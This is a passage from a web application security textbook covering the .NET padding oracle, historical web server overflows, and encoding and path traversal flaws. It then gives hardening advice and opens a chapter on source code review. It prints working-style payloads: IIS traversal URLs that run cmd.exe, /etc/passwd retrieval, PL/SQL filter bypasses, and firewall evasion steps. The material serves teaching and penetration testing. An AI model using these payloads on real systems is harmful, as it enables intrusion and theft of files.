years, mainstream web server platforms have become increasingly robust. In 
many cases core functionality has remained static or has even been reduced as 
vendors have deliberately decreased the default attack surface. Even as these 
vulnerabilities have decreased, the underlying principles remain valid. In the 
fi rst edition of this book, we gave examples of where server software is most 
susceptible to vulnerabilities. Since that fi rst edition, new instances have been 
reported in each category, often in a parallel technology or server product. Setting 
aside some of the smaller personal web servers and other minor targets, these 
new vulnerabilities have typically arisen in the following:
n Server-side extensions in both IIS and Apache.
n Newer web servers that are developed from the ground up to support a 
specifi c application or that are supplied as part of a development environment. These are likely to have received less real-world attention from 
hackers and are more susceptible to the issues described here.
Application Framework Flaws
Web application frameworks have been the subject of various serious defects 
over the years. We will describe one recent example of a generic example in a 
framework that made vulnerable many applications running on that framework.
The .NET Padding Oracle
One of the most famous disclosures in recent years is the ‚Äúpadding oracle‚Äù 
exploit in .NET. .NET uses PKCS #5 padding on a CBC block cipher, which 
operates as follows.
A block cipher operates on a fi xed block size, which in .NET is commonly 
8 or 16 bytes. .NET uses the PKCS #5 standard to add padding bytes to every 
plaintext string, ensuring that the resultant plaintext string length is divisible by 
the block size. Rather than pad the message with an arbitrary value, the value 
selected for padding is the number of padding bytes that is being used. Every 
string is padded, so if the initial string is a multiple of the block size, a full block 
of padding is added. So in a block size of 8, a message must be padded with 
either one 0x01 byte, two 0x02 bytes, or any of the intermediary combinations 
up to eight 0x08 bytes. The plaintext of the fi rst message is then XORed with a 
preset message block called an initialization vector (IV). (Remember the issues 
with picking out patterns in ciphertext discussed in Chapter 7.) As described 
in Chapter 7, the second message is then XORed with the ciphertext from the 
fi rst message, starting the cyclic block chain.
c18.indd 685 c18.indd 685 8/19/2011 12:17:53 PM 8/19/2011 12:17:53 PM
Stuttard c18.indd V2 - 07/28/2011 Page 686
686 Chapter 18 n Attacking the Application Server 
The full .NET encryption process is as follows:
 1. Take a plaintext message.
 2. Pad the message, using the required number of padding bytes as the padding byte value.
 3. XOR the fi rst plaintext block with the initialization vector.
 4. Encrypt the XORed value from step 3 using Triple-DES.
From then on, the steps of encrypting the rest of the message are recursive 
(this is the cipher block chaining (CBC) process described in Chapter 7):
 5. XOR the second plaintext block with the encrypted previous block.
 6. Encrypt the XORed value using Triple-DES.
The Padding Oracle
Vulnerable versions of .NET up to September 2010 contained a seemingly small 
information disclosure fl aw. If incorrect padding was found in the message, the 
application would report an error, resulting in a 500 HTTP response code to the 
user. Using the behaviors of the PKCS #5 padding algorithm and CBC together, 
the entire .NET security mechanism could be compromised. Here‚Äôs how.
Note that to be valid, all plaintext strings should include at least one byte 
of padding. Additionally, note that the fi rst block of ciphertext you see is the 
initialization vector, which serves no purpose other than to XOR against the 
plaintext value of the message‚Äôs fi rst encrypted block. For the attack, the attacker 
supplies a string containing only the fi rst two ciphertext blocks to the application. These two blocks are the IV, followed by the fi rst block of ciphertext. 
The attacker supplies an IV containing only zeroes and then makes a series 
of requests, sequentially incrementing the last byte of the IV. This last byte is 
XORed with the last byte in the ciphertext, and unless the resultant value for 
this last byte is 0x01, the cryptographic algorithm throws an error! (Remember 
that the cleartext value of any string must end in one or more padding values. 
Because no other padding is present in the fi rst ciphertext block, the last value 
must be decrypted as 0x01.)
An attacker can leverage this error condition: eventually he will hit on the 
value that, when XORed with the last byte of the ciphertext block, results in 0x01. 
At this point the cleartext value of the last byte y can be determined, because:
x XOR y = 0x01
so we have just determined the value of x.
The same process works on the second-to-last byte in the ciphertext. This 
time, the attacker (knowing the value of y) chooses the value of x for which the 
last byte will be decrypted as 0x02. Then he performs the same incremental 
process on the second-to-last character in the initialization vector, receiving 500 
c18.indd 686 c18.indd 686 8/19/2011 12:17:53 PM 8/19/2011 12:17:53 PM
86 Stuttard c18.indd V2 - 07/28/2011 Page 687
 Chapter 18 n Attacking the Application Server 687
Internal Server Error messages until the second-to-last decrypted byte is 
0x02. At this point, two 0x02 bytes are at the end of the message, which equates 
to valid padding, and no error is returned. This process can then be recursively 
applied across all bits of the targeted block, and then on the following ciphertext 
block, through all the blocks in the message.
In this way, an attacker can decrypt the whole message. Interestingly, the 
same mechanism lets the attacker encrypt a message. Once you have recovered 
a plaintext string, you can modify the IV to produce the plaintext string of your 
choosing. One of the best targets is ScriptResource.axd. The d argument of 
ScriptResource is an encrypted fi lename. An attacker choosing a fi lename of 
web.config is served the actual fi le, because ASP.NET bypasses the normal 
restrictions imposed by IIS in serving the fi le. For example:
https://mdsec.net/ScriptResource.axd?d=SbXSD3uTnhYsK4gMD8fL84_mHPC5jJ7lf
dnr1_WtsftZiUOZ6IXYG8QCXW86UizF0&t=632768953157700078
NOTE This attack applies more generally to any CBC ciphers using PKCS #5 
padding. It was originally discussed in 2002, although .NET is a prime target because it uses this type of padding for session tokens, ViewState, and 
ScriptResource.axd. The original paper can be found at www.iacr.org/
archive/eurocrypt2002/23320530/cbc02_e02d.pdf.
WARNING ‚ÄúNever roll your own cryptographic algorithms‚Äù is often a throwaway comment based on received wisdom. However, the bit fl ipping attack 
described in Chapter 7 and the padding oracle attack just mentioned both show 
how seemingly tiny anomalies can be practically exploited to produce catastrophic results. So never roll your own cryptographic algorithms.
TRY IT!
http://mdsec.net/private/
Memory Management Vulnerabilities
Buffer overfl ows are among the most serious fl aws that can affect any kind of software, because they normally allow an attacker to take control of execution in the 
vulnerable process (see Chapter 16). Achieving arbitrary code execution within a 
web server usually enables an attacker to compromise any application it is hosting.
The following sections present a tiny sample of web server buffer overfl ows. 
They illustrate the pervasiveness of this fl aw, which has arisen in a wide range 
of web server products and components.
c18.indd 687 c18.indd 687 8/19/2011 12:17:54 PM 8/19/2011 12:17:54 PM
Stuttard c18.indd V2 - 07/28/2011 Page 688
688 Chapter 18 n Attacking the Application Server 
Apache mod_isapi Dangling Pointer
In 2010 a fl aw was found whereby Apache‚Äôs mod_isapi could be forced to be 
unloaded from memory when encountering errors. The corresponding function 
pointers remain in memory and can be called when the corresponding ISAPI 
functions are referenced, accessing arbitrary portions of memory.
For more information on this fl aw, see www.senseofsecurity.com.au/
advisories/SOS-10-002.
Microsoft IIS ISAPI Extensions
Microsoft IIS versions 4 and 5 contained a range of ISAPI extensions that were 
enabled by default. Several of these were found to contain buffer overfl ows, such 
as the Internet Printing Protocol extension and the Index Server extension, both 
of which were discovered in 2001. These fl aws enabled an attacker to execute 
arbitrary code within the Local System context, thereby fully compromising the 
whole computer. These fl aws also allowed the Nimda and Code Red worms 
to propagate and begin circulating. The following Microsoft TechNet bulletins 
detail these fl aws:
n www.microsoft.com/technet/security/bulletin/MS01-023.mspx
n www.microsoft.com/technet/security/bulletin/MS01-033.mspx
Seven Years Later
A further fl aw was found in the IPP service in 2008. This time, the majority 
of deployed versions of IIS on Windows 2003 and 2008 were not immediately 
vulnerable because the extension is disabled by default. The advisory posted by 
Microsoft can be found at www.microsoft.com/technet/security/bulletin/
ms08-062.mspx.
Apache Chunked Encoding Overfl ow
A buffer overfl ow resulting from an integer signedness error was discovered in 
the Apache web server in 2002. The affected code had been reused in numerous 
other web sever products, which were also affected. For more details, see www
.securityfocus.com/bid/5033/discuss.
Eight Years Later
In 2010, an integer overfl ow was found in Apache‚Äôs mod_proxy when handling 
chunked encoding in HTTP responses. A write-up of this vulnerability can be 
found at www.securityfocus.com/bid/37966.
c18.indd 688 c18.indd 688 8/19/2011 12:17:54 PM 8/19/2011 12:17:54 PM
88 Stuttard c18.indd V2 - 07/28/2011 Page 689
 Chapter 18 n Attacking the Application Server 689
WebDAV Overfl ows
A buffer overfl ow in a core component of the Windows operating system was 
discovered in 2003. This bug could be exploited through various attack vectors, 
the most signifi cant of which for many customers was the WebDAV support 
built in to IIS 5. The vulnerability was being actively exploited in the wild at 
the time a fi x was produced. This vulnerability is detailed at www.microsoft
.com/technet/security/bulletin/MS03-007.mspx.
Seven Years Later
Implementation of WebDAV has introduced vulnerabilities across a range of 
web servers.
In 2010, it was discovered that an overly long path in an OPTIONS request 
caused an overfl ow in Sun‚Äôs Java System Web Server. You can read more about 
this at www.exploit-db.com/exploits/14287/.
A further buffer overfl ow issue from 2009 was reported in Apache‚Äôs mod_dav
extension. More details can be found at http://cve.mitre.org/cgi-bin/cvename
.cgi?name=CVE-2010-1452.
Encoding and Canonicalization
As described in Chapter 3, various schemes exist that allow special characters 
and content to be encoded for safe transmission over HTTP. You have already 
seen, in the context of several types of web application vulnerabilities, how 
an attacker can leverage these schemes to evade input validation checks and 
perform other attacks.
Encoding fl aws have arisen in many kinds of application server software. 
They present an inherent threat in situations where the same user-supplied 
data is processed by several layers using different technologies. A typical web 
request might be handled by the web server, the application platform, various 
managed and unmanaged APIs, other software components, and the underlying operating system. If different components handle an encoding scheme in 
different ways, or perform additional decoding or interpretation of data that 
has already been partially processed, this fact can often be exploited to bypass 
fi lters or cause other anomalous behavior.
Path traversal is one of the most prevalent vulnerabilities that can be exploited 
via a canonicalization fl aw because it always involves communication with 
the operating system. Chapter 10 describes how path traversal vulnerabilities 
can arise in web applications. The same types of problems have also arisen in 
numerous types of web server software, enabling an attacker to read or write 
arbitrary fi les outside the web root.
c18.indd 689 c18.indd 689 8/19/2011 12:17:54 PM 8/19/2011 12:17:54 PM
Stuttard c18.indd V2 - 07/28/2011 Page 690
690 Chapter 18 n Attacking the Application Server 
Apple iDisk Server Path Traversal
The Apple iDisk Server is a popular cloud synchronized storage service. In 
2009, Jeremy Richards discovered that it was vulnerable to directory traversal.
An iDisk user has a directory structure that includes a public directory, the 
contents of which are purposely accessible to unauthenticated Internet users. 
Richards discovered that arbitrary content could be retrieved from the private 
sections of a user‚Äôs iDisk by using Unicode characters traverse from the public 
folder to access a private fi le:
http://idisk.mac.com/Jeremy.richards-Public/%2E%2E%2FPRIVATE.txt?disposition=
download+8300
An added bonus was that a WebDAV PROPFIND request could be issued fi rst 
to list the contents of the iDisk:
POST /Jeremy.richards-Public/<strong>%2E%2E%2F/<strong>?webdav-method=
PROPFIND
...
Ruby WEBrick Web Server
WEBrick is a web server provided as part of Ruby. It was found to be vulnerable 
to a simple traversal fl aw of this form:
http://[server]:[port]/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/boot.ini
For more information about this fl aw, see www.securityfocus.com/bid/28123.
Java Web Server Directory Traversal
This path traversal fl aw exploited the fact that the JVM did not decode UTF-8. Web 
servers written in Java and using vulnerable versions of the JVM included Tomcat, 
and arbitrary content could be retrieved using UTF-8 encoded ../ sequences:
http://www.target.com/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
For more information about this fl aw, see http://tomcat.apache.org
/security-6.html.
Allaire JRun Directory Listing Vulnerability
In 2001, a vulnerability was found in Allaire JRun that enabled an attacker to 
retrieve directory listings even in directories containing a default fi le such as 
index.html. A listing could be retrieved using URLs of the following form:
https://wahh-app.com/dir/%3f.jsp
c18.indd 690 c18.indd 690 8/19/2011 12:17:54 PM 8/19/2011 12:17:54 PM
90 Stuttard c18.indd V2 - 07/28/2011 Page 691
 Chapter 18 n Attacking the Application Server 691
%3f is a URL-encoded question mark, which is normally used to denote the 
start of the query string. The problem arose because the initial URL parser did 
not interpret the %3f as being the query string indicator. Treating the URL as 
ending with .jsp, the server passed the request to the component that handles 
requests for JSP fi les. This component then decoded the %3f, interpreted it 
as the start of the query string, found that the resulting base URL was not 
a JSP fi le, and returned the directory listing. Further details can be found at 
www.securityfocus.com/bid/3592.
Eight Years Later
In 2009, a similar much lower-risk vulnerability was announced in Jetty 
relating to directory traversal in situations where a directory name ended 
in a question mark. The solution was to encode the ? as %3f. Details can be 
found at https://www.kb.cert.org/vuls/id/402580.
Microsoft IIS Unicode Path Traversal Vulnerabilities
Two related vulnerabilities were identifi ed in the Microsoft IIS server in 2000 
and 2001. To prevent path traversal attacks, IIS checked for requests containing the dot-dot-slash sequence in both its literal and URL-encoded forms. If a 
request did not contain these expressions, it was accepted for further processing. 
However, the server then performed some additional canonicalization on the 
requested URL, enabling an attacker to bypass the fi lter and cause the server 
to process traversal sequences.
In the fi rst vulnerability, an attacker could supply various illegal Unicodeencoded forms of the dot-dot-slash sequence, such as ..%c0%af. This expression 
did not match IIS‚Äôs upfront fi lters, but the later processing tolerated the illegal 
encoding and converted it back to a literal traversal sequence. This enabled an 
attacker to step out of the web root and execute arbitrary commands with URLs 
like the following:
https://wahh-app.com/scripts/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../
winnt/system32/cmd.exe?/c+dir+c:\
In the second vulnerability, an attacker could supply double-encoded forms 
of the dot-dot-slash sequence, such as ..%255c. Again, this expression did not 
match IIS‚Äôs fi lters, but the later processing performed a superfl uous decode of 
the input, thereby converting it back to a literal traversal sequence. This enabled 
an alternative attack with URLs like the following:
https://wahh-app.com/scripts/..%255c..%255c..%255c..%255c..%255c..
%255cwinnt/system32/cmd.exe?/c+dir+c:\
c18.indd 691 c18.indd 691 8/19/2011 12:17:54 PM 8/19/2011 12:17:54 PM
Stuttard c18.indd V2 - 07/28/2011 Page 692
692 Chapter 18 n Attacking the Application Server 
Further details on these vulnerabilities can be found here:
n www.microsoft.com/technet/security/bulletin/MS00-078.mspx
n www.microsoft.com/technet/security/bulletin/MS01-026.mspx
Nine Years Later
The enduring signifi cance of encoding and canonicalization vulnerabilities in 
web server software can be seen in the reemergence of a similar IIS vulnerability, 
this time in WebDAV, in 2009. A fi le protected by IIS could be downloaded by 
inserting a rogue %c0%af string into the URL. IIS grants access to this resource 
because it does not appear to be a request for the protected fi le. But the rogue 
string is later stripped from the request:
GET /prote%c0%afcted/protected.zip HTTP/1.1
Translate: f
Connection: close
Host: wahh-app.net
The Translate: f header ensures that this request is handled by the WebDAV 
extension. The same attack can be carried out directly within a WebDAV request 
using the following:
PROPFIND /protec%c0%afted/ HTTP/1.1
Host: wahh-app.net
User-Agent: neo/0.12.2
Connection: TE
TE: trailers
Depth: 1
Content-Length: 288
Content-Type: application/xml
<?xml version=‚Äù1.0‚Äù encoding=‚Äùutf-8‚Äù?>
<propfind xmlns=‚ÄùDAV:‚Äù><prop>
<getcontentlength xmlns=‚ÄùDAV:‚Äù/>
<getlastmodified xmlns=‚ÄùDAV:‚Äù/>
<executable xmlns=‚Äùhttp://apache.org/dav/props/‚Äù/>
<resourcetype xmlns=‚ÄùDAV:‚Äù/>
<checked-in xmlns=‚ÄùDAV:‚Äù/>
<checked-out xmlns=‚ÄùDAV:‚Äù/>
</prop></propfind>
For more information, see www.securityfocus.com/bid/34993/.
Oracle PL/SQL Exclusion List Bypasses
Recall the dangerous default functionality that was accessible via Oracle‚Äôs PL/
SQL gateway. To address this issue, Oracle created the PL/SQL Exclusion List, 
c18.indd 692 c18.indd 692 8/19/2011 12:17:54 PM 8/19/2011 12:17:54 PM
92 Stuttard c18.indd V2 - 07/28/2011 Page 693
 Chapter 18 n Attacking the Application Server 693
which blocks access to packages whose names begin with certain expressions, 
such as OWA and SYS.
Between 2001 and 2007, David Litchfi eld discovered a series of bypasses to the 
PL/SQL Exclusion List . In the fi rst vulnerability, the fi lter can be bypassed by 
placing whitespace (such as a newline, space, or tab) before the package name:
https://wahh-app.com/pls/dad/%0ASYS.package.procedure
This bypasses the fi lter, and the back-end database ignores the whitespace, 
causing the dangerous package to be executed.
In the second vulnerability, the fi lter can be bypassed by replacing the letter 
Y with %FF, which represents the √ø character:
https://wahh-app.com/pls/dad/S%FFS.package.procedure
This bypasses the fi lter, and the back-end database canonicalizes the character 
back to a standard Y, thereby invoking the dangerous package.
In the third vulnerability, the fi lter can be bypassed by enclosing a blocked 
expression in double quotation marks:
https://wahh-app.com/pls/dad/‚ÄùSYS‚Äù.package.procedure
This bypasses the fi lter, and the back-end database tolerates quoted package 
names, meaning that the dangerous package is invoked.
In the fourth vulnerability, the fi lter can be bypassed by using angle brackets 
to place a programming goto label before the blocked expression:
https://wahh-app.com/pls/dad/<<FOO>>SYS.package.procedure
This bypasses the fi lter. The back-end database ignores the goto label and 
executes the dangerous package.
Each of these different vulnerabilities arises because the front-end fi ltering is 
performed by one component on the basis of simple text-based pattern matching. 
The subsequent processing is performed by a different component that follows 
its own rules to interpret the syntactic and semantic signifi cance of the input. 
Any differences between the two sets of rules may present an opportunity for 
an attacker to supply input that does not match the patterns used in the fi lter 
but that the database interprets in such a way that the attacker‚Äôs desired package 
is invoked. Because the Oracle database is so functional, there is ample room 
for differences of this kind to arise.
More information about these vulnerabilities can be found here:
n www.securityfocus.com/archive/1/423819/100/0/threaded
n The Oracle Hacker‚Äôs Handbook by David Litchfi eld (Wiley, 2007)
c18.indd 693 c18.indd 693 8/19/2011 12:17:55 PM 8/19/2011 12:17:55 PM
Stuttard c18.indd V2 - 07/28/2011 Page 694
694 Chapter 18 n Attacking the Application Server 
Seven Years Later
An issue was discovered in 2008 within the Portal Server (part of the Oracle 
Application Server). An attacker with a session ID cookie value ending in %0A
would be able to bypass the default Basic Authentication check.
Finding Web Server Flaws
If you are lucky, the web server you are targeting may contain some of the actual 
vulnerabilities described in this chapter. More likely, however, it will have been 
patched to a more recent level, and you will need to search for something fairly 
current or brand new with which to attack the server.
A good starting point when looking for vulnerabilities in an off-the-shelf 
product such as a web server is to use an automated scanning tool. Unlike web 
applications, which are usually custom-built, almost all web server deployments 
use third-party software that has been installed and confi gured in the same 
way that countless other people have done before. In this situation, automated 
scanners can be quite effective at quickly locating low-hanging fruit by sending huge numbers of crafted requests and monitoring for signatures indicating 
the presence of known vulnerabilities. Nessus is an excellent free vulnerability 
scanner, and various commercial alternatives are available.
In addition to running scanning tools, you should always perform your own 
research on the software you are attacking. Consult resources such as Security 
Focus, OSVDB, and the mailing lists Bugtraq and Full Disclosure to fi nd details 
of any recently discovered vulnerabilities that may not have been fi xed on your 
target. Always check the Exploit Database and Metasploit to see if someone 
has done the work for you and created the corresponding exploit as well. The 
following URLs should help:
n www.exploit-db.com
n www.metasploit.com/
n www.grok.org.uk/full-disclosure/
n http://osvdb.org/search/advsearch
You should be aware that some web application products include an open source 
web server such as Apache or Jetty as part of their installation. Security updates 
to these bundled servers may be applied more slowly because administrators 
may view the server as part of the installed application, rather than as part of the 
infrastructure they are responsible for. Applying a direct update rather than waiting for the application vendor‚Äôs patch is also likely to invalidate support contracts. 
Therefore, performing some manual testing and research on the software may 
be highly effective in identifying defects that an automated scanner may miss.
If possible, you should consider performing a local installation of the software 
you are attacking, and carry out your own testing to fi nd new vulnerabilities 
that have not been discovered or widely circulated.
c18.indd 694 c18.indd 694 8/19/2011 12:17:55 PM 8/19/2011 12:17:55 PM
94 Stuttard c18.indd V2 - 07/28/2011 Page 695
 Chapter 18 n Attacking the Application Server 695
Securing Web Server Software
To some extent, an organization deploying a third-party web server product 
inevitably places its fate in the hands of the software vendor. Nevertheless, a 
security-conscious organization can do a lot to protect itself against the kind 
of software vulnerabilities described in this chapter.
Choose Software with a Good Track Record
Not all software products and vendors are created equal. Taking a look at the 
recent history of different server products reveals some marked differences 
in the quantity of serious vulnerabilities found, the time taken by vendors to 
resolve them, and the resilience of the released fi xes to subsequent testing by 
researchers. Before choosing which web server software to deploy, you should 
investigate these differences and consider how your organization would have 
fared in recent years if it had used each kind of software you are considering.
Apply Vendor Patches
Any decent software vendor must release security updates periodically. Sometimes 
these address issues that the vendor itself discovered in-house. In other cases, 
the problems were reported by an independent researcher, who may or may 
not have kept the information to herself. Other vulnerabilities are brought to 
the vendor‚Äôs attention because they are being actively exploited in the wild. But 
in every case, as soon as a patch is released, any decent reverse engineer can 
quickly pinpoint the issue it addresses, enabling attackers to develop exploits 
for the problem. Wherever feasible, therefore, security fi xes should be applied 
as soon as possible after they are made available.
Perform Security Hardening
Most web servers have numerous confi gurable options controlling what functionality 
is enabled and how it behaves. If unused functionality, such as default ISAPI extensions, is left enabled, your server is at increased risk of attack if new vulnerabilities 
are discovered within that functionality. You should consult hardening guides 
specifi c to the software you are using, but here are some generic steps to consider:
n Disable any built-in functionality that is not required, and confi gure the 
remaining functionality to behave as restrictively as possible, consistent 
with your business requirements. This may include removing mapped 
fi le extensions, web server modules, and database components. You can 
use tools such as IIS Lockdown to facilitate this task.
n If the application itself is composed of any additional custom-written 
server extensions developed in native code, consider whether these can be 
c18.indd 695 c18.indd 695 8/19/2011 12:17:55 PM 8/19/2011 12:17:55 PM
Stuttard c18.indd V2 - 07/28/2011 Page 696
696 Chapter 18 n Attacking the Application Server 
rewritten using managed code. If they can‚Äôt, ensure that additional input 
validation is performed by your managed-code environment before it is 
passed to these functions.
n Many functions and resources that you need to retain can often be renamed 
from their default values to present an additional barrier to exploitation. Even 
if a skilled attacker may still be able to discover the new name, this obscurity measure defends against less-skilled attackers and automated worms.
n Apply the principle of least privilege throughout the technology stack. For 
example, container security can cut down the attack surface presented to 
a standard application user. The web server process should be confi gured 
to use the least powerful operating system account possible. On UNIXbased systems, a chrooted environment can be used to further contain 
the impact of any compromise.
Monitor for New Vulnerabilities
Someone in your organization should be assigned to monitor resources such 
as Bugtraq and Full Disclosure for announcements and discussions about new 
vulnerabilities in the software you are using. You can also subscribe to various 
private services to receive early notifi cation of known vulnerabilities in software that have not yet been publicly disclosed. Often, if you know the technical 
details of a vulnerability, you can implement an effective work-around pending 
release of a full fi x by the vendor.
Use Defense-in-Depth
You should always implement layers of protection to mitigate the impact of a 
security breach within any component of your infrastructure. You can take various steps to help localize the impact of a successful attack on your web server. 
Even in the event of a complete compromise, these may give you suffi cient time 
to respond to the incident before any signifi cant data loss occurs:
n You can impose restrictions on the web server‚Äôs capabilities from other, 
autonomous components of the application. For example, the database 
account used by the application can be given only INSERT access to the tables 
used to store audit logs. This means that an attacker who compromises the 
web server cannot delete any log entries that have already been created.
n You can impose strict network-level fi lters on traffi c to and from the web 
server.
n You can use an intrusion detection system to identify any anomalous 
network activity that may indicate that a breach has occurred. After compromising a web server, many attackers immediately attempt to create 
c18.indd 696 c18.indd 696 8/19/2011 12:17:55 PM 8/19/2011 12:17:55 PM
96 Stuttard c18.indd V2 - 07/28/2011 Page 697
 Chapter 18 n Attacking the Application Server 697
a reverse connection to the Internet or scan for other hosts on the DMZ 
network. An effective IDS will notify you of these events in real time, 
enabling you to take measures to arrest the attack.
Web Application Firewalls
Many applications are protected by an external component residing either on 
the same host as the application or on a network-based device. These can be 
categorized as performing either intrusion prevention (application fi rewalls) or 
detection (such as conventional intrusion detection systems). Due to similarities 
in how these devices identify attacks, we will treat them fairly interchangeably. 
Although many would argue that having these is better than nothing at all, in 
many cases they may create a false sense of security in the belief that an extra 
layer of defense implies an automatic improvement of the defensive posture. 
Such a system is unlikely to lower the security and may be able to stop a clearly 
defi ned attack such as an Internet worm, but in other cases it may not be improving security as much as is sometimes believed.
Immediately it can be noted that unless such defenses employ heavily customized rules, they do not protect against any of the vulnerabilities discussed in 
Chapters 4 through 8 and have no practical use in defending potential fl aws in 
business logic (Chapter 11). They also have no role to play in defending against 
some specifi c attacks such as DOM-based XSS (Chapter 12). For the remaining 
vulnerabilities where a potential attack pattern may be exhibited, several points 
often diminish the usefulness of a web application fi rewall:
n If the fi rewall follows HTTP specifi cations too closely, it may make 
assumptions about how the application server will handle the request. 
Conversely, fi rewall or IDS devices that have their origins in networklayer defenses often do not understand the details of certain HTTP 
transmission methods.
n The application server itself may modify user input by decoding it, adding escape characters, or fi ltering out specifi c strings in the course of 
serving a request after it has passed the fi rewall. Many of the attack steps 
described in previous chapters are aimed at bypassing input validation, and 
application-layer fi rewalls can be susceptible to the same types of attacks.
n Many fi rewalls and IDSs alert based on specifi c common attack payloads, not on the general exploitation of a vulnerability. If an attacker 
can retrieve an arbitrary fi le from the fi lesystem, a request for /manager/
viewtempl?loc=/etc/passwd is likely to be blocked, whereas a request 
to /manager/viewtempl?loc=/var/log/syslog would not be termed an 
attack, even though its contents may be more useful to an attacker.
c18.indd 697 c18.indd 697 8/19/2011 12:17:55 PM 8/19/2011 12:17:55 PM
Stuttard c18.indd V2 - 07/28/2011 Page 698
698 Chapter 18 n Attacking the Application Server 
At a high level, we do not need to distinguish between a global input validation fi lter, host-based agent, or network-based web application fi rewall. The 
following steps apply to all in equal measure.
HACK STEPS
The presence of a web application fi rewall can be deduced using the following 
steps:
 1. Submit an arbitrary parameter name to the application with a clear attack 
payload in the value, ideally somewhere the application includes the 
name and/or value in the response. If the application blocks the attack, 
this is probably due to an external defense.
 2. If a variable can be submitted that is returned in a server response, submit a range of fuzz strings and encoded variants to identify the behavior 
of the application defenses to user input.
 3. Confirm this behavior by performing the same attacks on variables within 
the application.
You can try the following strings to attempt to bypass a web application 
fi rewall:
 1. For all fuzzing strings and requests, use benign strings for payloads that 
are unlikely to exist in a standard signature database. Giving examples of 
these is, by definition, not possible. But you should avoid using 
/etc/passwd or /windows/system32/config/sam as payloads for file 
retrieval. Also avoid using terms such as <script> in an XSS attack and 
using alert() or xss as XSS payloads.
 2. If a particular request is blocked, try submitting the same parameter in a 
different location or context. For instance, submit the same parameter 
in the URL in a GET request, within the body of a POST request, and within 
the URL in a POST request.
 3. On ASP.NET, also try submitting the parameter as a cookie. The API 
Request.Params[‚Äúfoo‚Äù] retrieves the value of a cookie named foo if 
the parameter foo is not found in the query string or message body.
 4. Review all the other methods of introducing user input provided in 
Chapter 4, choosing any that are unprotected.
 5. Determine locations where user input is (or can be) submitted in a nonstandard format such as serialization or encoding. If none are available, build 
the attack string by concatenation and/or by spanning it across multiple 
variables. (Note that if the target is ASP.NET, you may be able to use HPP to 
concatenate the attack using multiple specifications of the same variable.)
Many organizations that deploy web application fi rewalls or IDSs do not have 
them specifi cally tested according to a methodology like the one described in this 
section. As a result, it is often worth persevering in an attack against such devices.
c18.indd 698 c18.indd 698 8/19/2011 12:17:56 PM 8/19/2011 12:17:56 PM
98 Stuttard c18.indd V2 - 07/28/2011 Page 699
 Chapter 18 n Attacking the Application Server 699
Summary
As with the other components on which a web application runs, the web server 
represents a signifi cant area of attack surface via which an application may be 
compromised. Defects in an application server can often directly undermine 
an application‚Äôs security by giving access to directory listings, source code for 
executable pages, sensitive confi guration and runtime data, and the ability to 
bypass input fi lters.
Because of the wide variety of application server products and versions, 
locating web server vulnerabilities usually involves some reconnaissance and 
research. However, this is one area in which automated scanning tools can be 
highly effective at quickly locating known vulnerabilities within the confi guration and software of the server you are attacking.
Questions
Answers can be found at http://mdsec.net/wahh.
 1. Under what circumstances does a web server display a directory listing?
 2. What are WebDAV methods used for, and why might they be dangerous?
 3. How can you exploit a web server that is confi gured to act as a web proxy?
 4. What is the Oracle PL/SQL Exclusion List, and how can it be bypassed?
 5. If a web server allows access to its functionality over both HTTP and 
HTTPS, are there any advantages to using one protocol over the other 
when you are probing for vulnerabilities?
c18.indd 699 c18.indd 699 8/19/2011 12:17:56 PM 8/19/2011 12:17:56 PM
c18.indd 700 c18.indd 700 8/19/2011 12:17:56 PM 8/19/2011 12:17:56 PM
Stuttard c19.indd V2 - 08/11/2011 Page 701
701
C H A P T E R 
19
Finding Vulnerabilities 
in Source Code
So far, the attack techniques we have described have all involved interacting 
with a live running application and have largely consisted of submitting crafted 
input to the application and monitoring its responses. This chapter examines an 
entirely different approach to fi nding vulnerabilities ‚Äî reviewing the application‚Äôs source code.
In various situations it may be possible to perform a source code audit to help 
attack a target web application:
n Some applications are open source, or use open source components, 
enabling you to download their code from the relevant repository and 
scour it for vulnerabilities.
n If you are performing a penetration test in a consultancy context, the application owner may grant you access to his or her source code to maximize 
the effectiveness of your audit.
n You may discover a fi le disclosure vulnerability within an application that 
enables you to download its source code (either partially or in its entirety).
n Most applications use some client-side code such as JavaScript, which is 
accessible without requiring any privileged access.
It is often believed that to carry out a code review, you must be an experienced programmer and have detailed knowledge of the language being used. 
However, this need not be the case. Many higher-level languages can be read 
c19.indd 701 c19.indd 701 8/19/2011 12:18:34 PM 8/19/2011 12:18:34 PM
Stuttard c19.indd V2 - 08/11/2011 Page 702
702 Chapter 19 n Finding Vulnerabilities in Source Code 
and understood by someone with limited programming experience. Also, many 
types of vulnerabilities manifest themselves in the same way across all the languages commonly used for web applications. The majority of code reviews can 
be carried out using a standard methodology. You can use a cheat sheet to help 
understand the relevant syntax and APIs that are specifi c to the language and 
environment you are dealing with. This chapter describes the core methodology you need to follow and provides cheat sheets for some of the languages 
you are likely to encounter.
Approaches to Code Review
You can take a variety of approaches to carrying out a code review to help 
maximize your effectiveness in discovering security fl aws within the time 
available. Furthermore, you can often integrate your code review with other 
test approaches to leverage the inherent strengths of each.
Black-Box Versus White-Box Testing
The attack methodology described in previous chapters is often described as a 
black-box approach to testing. This involves attacking the application from the 
outside and monitoring its inputs and outputs, with no prior knowledge of its 
inner workings. In contrast, a white-box approach involves looking inside the 
application‚Äôs internals, with full access to design documentation, source code, 
and other materials.
Performing a white-box code review can be a highly effective way to discover 
vulnerabilities within an application. With access to source code, it is often possible 
to quickly locate problems that would be extremely diffi cult or time-consuming 
to detect using only black-box techniques. For example, a backdoor password 
that grants access to any user account may be easy to identify by reading the 
code but nearly impossible to detect using a password-guessing attack.
However, code review usually is not an effective substitute for black-box 
testing. Of course, in one sense, all the vulnerabilities in an application are ‚Äúin 
the source code,‚Äù so it must in principle be possible to locate all those vulnerabilities via code review. However, many vulnerabilities can be discovered more 
quickly and effi ciently using black-box methods. Using the automated fuzzing 
techniques described in Chapter 14, it is possible to send an application hundreds 
of test cases per minute, which propagate through all relevant code paths and 
return a response immediately. By sending triggers for common vulnerabilities 
to every fi eld in every form, it is often possible to fi nd within minutes a mass 
of problems that would take days to uncover via code review. Furthermore, 
many enterprise-class applications have a complex structure with numerous 
c19.indd 702 c19.indd 702 8/19/2011 12:18:34 PM 8/19/2011 12:18:34 PM
Stuttard c19.indd V2 - 08/11/2011 Page 703
 Chapter 19 n Finding Vulnerabilities in Source Code 703
layers of processing of user-supplied input. Different controls and checks are 
